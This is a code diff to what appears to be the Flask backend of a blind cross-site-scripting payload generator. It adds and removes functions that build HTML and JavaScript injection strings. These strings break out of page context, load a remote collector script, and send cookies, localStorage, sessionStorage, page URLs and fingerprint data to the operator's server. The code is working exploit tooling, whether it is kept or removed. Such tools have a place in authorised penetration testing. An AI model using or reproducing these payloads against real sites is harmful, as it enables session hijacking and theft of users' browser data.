@@ -1,3 +1,4 @@
+import base64
 import json
 
 from app import db
@@ -46,8 +47,15 @@ def xss_generate():
 
     if code_type == "html":
         if "fingerprint" in to_gather or "dom" in to_gather or "screenshot" in to_gather:
-            pass
-        elif "local_storage" in to_gather or "session_storage" in to_gather or "cookies" in to_gather or "origin" in to_gather:
+            payload_start = f'\'>"><script src={url}/static/collector.min.js></script><script>sendData("'
+            payload_mid = str(
+                base64.b64encode(str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "to_gather": to_gather, "other_data": other_data})))
+            )
+            payload_end = '")</script>'
+            payload = payload_start + payload_mid + payload_end
+            return (payload), 200
+
+        elif "local_storage" in to_gather or "session_storage" in to_gather or "cookies" in to_gather or "origin" in to_gather or "referrer" in to_gather:
             payload_start = f'\'>"><script>new Image().src="{url}/api/x/{xss_type}/{client.uid}?'
 
             payload_other_data = "&".join({f"{k}={v}" for k, v in other_data.items()})
@@ -57,6 +65,7 @@ def xss_generate():
             payload_end = "</script>"
             payload = payload_start + payload_mid + payload_end
             return (payload), 200
+
         else:
             payload_start = f'\'>"><img src="{url}/api/x/{xss_type}/{client.uid}'
             payload_other_data = "&".join({f"{k}={v}" for k, v in other_data.items()})
@@ -67,7 +76,14 @@ def xss_generate():
 
     else:
         if "fingerprint" in to_gather or "dom" in to_gather or "screenshot" in to_gather:
-            pass
+            payload_start = f';}};var js=document.createElement("script");js.src="{url}/static/collector.min.js";js.onload=function(){{sendData("'
+            payload_mid = str(
+                base64.b64encode(str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "to_gather": to_gather, "other_data": other_data})))
+            )
+            payload_end = '")};document.body.appendChild(js);'
+            payload = payload_start + payload_mid + payload_end
+            return (payload), 200
+
         else:
             payload_start = f';}};new Image().src="{url}/api/x/{xss_type}/{client.uid}"'
 
@@ -87,139 +103,6 @@ def xss_generate():
             payload_end = ";"
             payload = payload_start + payload_mid + payload_end
             return (payload), 200
-
-
-# @bp.route("/xss/generate", methods=["GET"])
-# @jwt_required()
-def xss_generate_old():
-    """Generates an XSS payload"""
-
-    parameters = request.args.to_dict()
-
-    if "client_id" not in parameters:
-        return jsonify({"status": "error", "detail": "Missing client_id parameter"}), 400
-    if not parameters["client_id"].isnumeric():
-        return jsonify({"status": "error", "detail": "Bad client ID"}), 400
-
-    client = Client.query.filter_by(id=parameters["client_id"]).first_or_404()
-
-    parameters.pop("client_id", None)
-    uid = client.uid
-    other_data = ""
-    xss_type = "r"
-    require_js = False
-    require_params = False
-    cookies = False
-    local_storage = False
-    session_storage = False
-    get_url = False
-    i_want_it_all = False
-    code_type = "html"
-    url = ""
-
-    if "url" not in parameters.keys():
-        return jsonify({"status": "error", "detail": "Missing url parameter"}), 400
-
-    for param, value in parameters.items():
-
-        if param == "url":
-            url = value
-        elif param == "i_want_it_all":
-            i_want_it_all = True
-        elif param == "stored":
-            xss_type = "s"
-        elif param == "cookies":
-            cookies = True
-            require_js = True
-            require_params = True
-        elif param == "local_storage":
-            local_storage = True
-            require_js = True
-            require_params = True
-        elif param == "session_storage":
-            session_storage = True
-            require_js = True
-            require_params = True
-        elif param == "code":
-            if value == "html":
-                code_type = "html"
-            elif value == "js":
-                code_type = "js"
-                require_js = True
-            else:
-                return jsonify({"status": "error", "detail": "Unknown code type"}), 400
-        elif param == "geturl":
-            get_url = True
-            require_js = True
-            require_params = True
-        else:
-            if other_data != "":
-                other_data += "&"
-            other_data += "{}={}".format(param, value)
-            require_params = True
-
-    if i_want_it_all:
-        if code_type == "js":
-            payload = ';}};var js=document.createElement("script");js.src="{}/static/collector.min.js";js.onload=function(){{sendData("{}/api/x/{}/{}","{}")}};document.body.appendChild(js);'.format(
-                url, url, xss_type, uid, other_data
-            )
-            return (payload), 200
-        else:
-            payload = """'>"><script src={}/static/collector.min.js></script><script>sendData("{}/api/x/{}/{}", "{}")</script>""".format(
-                url, url, xss_type, uid, other_data
-            )
-            return (payload), 200
-
-    if code_type == "js":
-        payload = ';};new Image().src="'
-    else:
-        payload = """'>">"""
-        if require_js:
-            payload += '<script>new Image().src="'
-        else:
-            payload += '<img src="'
-
-    payload += "{}/api/x/{}/{}".format(url, xss_type, uid)
-
-    if require_params:
-        payload += "?"
-
-        if cookies:
-            payload += 'cookies="+encodeURIComponent(document.cookie)'
-
-        if local_storage:
-            if cookies:
-                payload += '+"&'
-            payload += 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))'
-
-        if session_storage:
-            if cookies or local_storage:
-                payload += '+"&'
-            payload += 'session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))'
-
-        if get_url:
-            if cookies or local_storage or session_storage:
-                payload += '+"&'
-            payload += 'origin_url="+encodeURIComponent(location.href)'
-
-        if other_data != "":
-            if cookies or local_storage or session_storage or get_url:
-                payload += '+"&'
-            payload += other_data
-            payload += '"'
-
-    if not require_params:
-        payload += '"'
-
-    if code_type == "js":
-        payload += ";"
-    else:
-        if require_js:
-            payload += "</script>"
-        else:
-            payload += " />"
-
-    return (payload), 200
 
 
 @bp.route("/xss/<int:xss_id>", methods=["GET"])
